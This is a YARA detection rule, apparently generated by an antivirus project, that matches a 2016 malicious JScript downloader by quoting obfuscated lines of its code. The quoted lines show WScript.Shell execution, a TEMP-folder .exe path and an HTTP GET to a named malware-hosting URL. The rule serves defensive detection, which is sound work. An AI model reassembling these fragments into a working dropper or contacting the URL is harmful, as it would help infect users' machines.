rule sig_20160328_3b977c152629b256a32b65ee5918aa8e {
  meta:
    description = "datamaliciousorder - file 20160328_3b977c152629b256a32b65ee5918aa8e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "84469e1e743d737c869ba60f32feded6014e69ad33864609a0fa6382c84f44af"

  strings:
    $s1  = "function Jenheye() {return Azptqnfrf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"NuuT59gHecaNvo.exe\";};" fullword ascii
    $s2  = "Jfvhtv[Zpgnduabf](\"GET\", \"http://finnskogen-oppvekstsenter.com/o4paka\", false);" fullword ascii
    $s3  = "do {WScript[Bsyxtjegeg](Tijpfvaksq() * 11)} while (Jfvhtv[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Aouemdqaqa(Hboggwyg, Slmzgj){return Hboggwyg - Slmzgj;};" fullword ascii
    $s5  = "var Azptqnfrf = function Ralrvqmox() {return WScript[Biacxqwz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Gwgtoctu() {return ((Nluapq == true) && (Nluapq == Ufiwi)) ? 1 : Egenj;};" fullword ascii
    $s7  = "function Ztbtibdlgs(Qnemjv){Azptqnfrf[\"Run\"](Qnemjv, Egenj, Egenj);};" fullword ascii
    $s8  = "function Ekmdhwqt()" fullword ascii
    $s9  = "function Tijpfvaksq(){return 22;};" fullword ascii
    $s10 = "var Khihvvsmvx = new this[\"Date\"]();" fullword ascii
    $s11 = "var Nluapq = false;" fullword ascii
    $s12 = "function Vlhouzne(Wdpldb) {var Nzqoij = (1, 2, 3, 4, 5, Wdpldb); return Nzqoij;};" fullword ascii
    $s13 = "function Fvgreoo(){return Biacxqwz;};" fullword ascii
    $s14 = "var Fbamzcvh = false;" fullword ascii
    $s15 = "Ufiwi = true; " fullword ascii
    $s16 = " while (Bqzsbx){" fullword ascii
    $s17 = "function Gnhyapdnxa(){return Wcbwbel;};" fullword ascii
    $s18 = "Nluapq = true; " fullword ascii
    $s19 = "return Aouemdqaqa(Vxwddhf, Sgyfg);" fullword ascii
    $s20 = "var Ufiwi = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}